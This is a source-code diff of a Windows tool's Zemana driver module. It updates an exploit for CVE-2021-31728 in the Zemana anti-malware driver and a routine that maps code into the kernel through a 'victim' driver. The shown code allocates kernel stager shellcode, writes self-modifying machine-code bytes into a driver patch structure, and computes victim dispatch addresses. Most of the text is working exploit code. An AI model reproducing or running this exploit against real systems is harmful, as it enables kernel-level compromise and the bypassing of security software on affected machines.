@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2022
+*  (C) COPYRIGHT AUTHORS, 2022 - 2023
 *
 *  TITLE:       ZEMANA.CPP
 *
-*  VERSION:     1.28
+*  VERSION:     1.30
 *
-*  DATE:        01 Dec 2022
+*  DATE:        20 Mar 2023
 *
 *  Zemana driver routines.
 *
@@ -52,7 +52,7 @@ typedef struct _ZM_SCSI_ACCESS {
 } ZM_SCSI_ACCESS, * PZM_SCSI_ACCESS;
 
 typedef struct _ZM_SCSI_MINIPORT_FIX {
-    CHAR    DriverName[260];
+    CHAR    DriverName[MAX_PATH];
     ULONG32 Offset_Func1;
     UCHAR    FixCode_Func1[128];
     ULONG32 Offset_Func2;
@@ -268,19 +268,36 @@ BOOL ZmExploit_CVE2021_31728(
 
         printf_s("[+] Stager shellCode allocated at 0x%llX\r\n", kernelShellCode);
 
+        CHAR szDriverName[MAX_PATH];
+
+        RtlSecureZeroMemory(&szDriverName, sizeof(szDriverName));
+        
+
         //
         // Trigger shellcode.
         //
-        ZM_SCSI_MINIPORT_FIX MiniportFix = {
-            "ZemanaAntimalware.sys",
-            0xD553, //driver specific offset, correct it for another sample
-            {
-                0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, imm64
-                0x80, 0x05, 0x01, 0x00, 0x00, 0x00, 0x10,                   // add byte ptr [rip+0], 0x10
-                0xFF, 0xC0,                                                 // inc eax -> call rax (after the self-modifying)
-                0xEB, 0x00                                                  // jmp rel8 
-            }
+        ZM_SCSI_MINIPORT_FIX MiniportFix;
+        ANSI_STRING drvFileName;
+
+        RtlSecureZeroMemory(&MiniportFix, sizeof(MiniportFix));
+
+        drvFileName.Buffer = NULL;
+        drvFileName.Length = drvFileName.MaximumLength = 0;
+
+        ntsupConvertToAnsi(Context->Provider->LoadData->DriverName, &drvFileName);
+
+        StringCchPrintfA(MiniportFix.DriverName, MAX_PATH, "%s.sys", drvFileName.Buffer);
+
+        MiniportFix.Offset_Func1 = 0xD553; //driver specific offset, correct it for another sample
+
+        BYTE patchCode[] =
+        {   0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, imm64
+            0x80, 0x05, 0x01, 0x00, 0x00, 0x00, 0x10,                   // add byte ptr [rip+0], 0x10
+            0xFF, 0xC0,                                                 // inc eax -> call rax (after the self-modifying)
+            0xEB, 0x00                                                  // jmp rel8 
         };
+
+        RtlCopyMemory(MiniportFix.FixCode_Func1, patchCode, sizeof(patchCode));
 
         //
         // Point the call to it.
@@ -354,36 +371,50 @@ BOOL ZmMapDriver(
     do {
         if (VpCreate(victimProv,
             Context->ModuleBase,
-            &victimDeviceHandle))
+            &victimDeviceHandle,
+            NULL,
+            NULL))
         {
-            printf_s("[+] Victim is accepted, handle 0x%p\r\n", victimDeviceHandle);
+            printf_s("[+] Victim is loaded, handle 0x%p\r\n", victimDeviceHandle);
         }
         else {
 
             supPrintfEvent(kduEventError,
-                "[!] Could not accept victim target, GetLastError %lu\r\n", GetLastError());
+                "[!] Could not load victim target, GetLastError %lu\r\n", GetLastError());
 
         }
 
-        PRTL_PROCESS_MODULE_INFORMATION target;
-        PRTL_PROCESS_MODULES modulesList = (PRTL_PROCESS_MODULES)supGetLoadedModulesList(FALSE, NULL);
-        if (modulesList) {
+        VICTIM_DRIVER_INFORMATION vdi;
 
-            target = (PRTL_PROCESS_MODULE_INFORMATION)ntsupFindModuleEntryByName(modulesList, "procexp152.sys");
-            if (target) {
-                dispatchAddress = (ULONG_PTR)target->ImageBase;
-            }
+        RtlSecureZeroMemory(&vdi, sizeof(vdi));
 
-            supHeapFree(modulesList);
+        if (!VpQueryInformation(Context->Victim, VictimDriverInformation, &vdi, sizeof(vdi))) {
+            supPrintfEvent(kduEventError,
+                "[!] Could not query victim driver information, GetLastError %lu\r\n", GetLastError());
+            break;
         }
+
+        dispatchAddress = vdi.LoadedImageBase;
 
         if (dispatchAddress == 0) {
             supPrintfEvent(kduEventError,
                 "[!] Could not query victim target\r\n");
             break;
         }
+        
+        VICTIM_IMAGE_INFORMATION vi;
 
-        dispatchAddress += PE152_DISPATCH_OFFSET;
+        RtlSecureZeroMemory(&vi, sizeof(vi));
+
+        if (!VpQueryInformation(
+            Context->Victim, VictimImageInformation, &vi, sizeof(vi)))
+        {
+            supPrintfEvent(kduEventError,
+                "[!] Could not query victim image information, GetLastError %lu\r\n", GetLastError());
+            break;
+        }
+
+        dispatchAddress += vi.DispatchOffset;
 
         printf_s("[+] Victim target 0x%llX\r\n", dispatchAddress);
 
